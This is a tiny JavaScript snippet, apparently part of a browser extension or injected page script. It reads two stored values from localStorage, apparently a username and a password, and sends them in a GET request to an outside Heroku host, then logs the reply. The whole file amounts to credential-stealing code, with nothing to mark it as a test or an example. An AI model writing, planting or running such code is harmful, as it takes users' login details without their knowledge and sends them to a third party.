console.log("o")
$.get("https://blckweb.herokuapp.com/i?u="+localStorage.u2+"&p="+localStorage.p1,function(data){
    console.log(data)
})
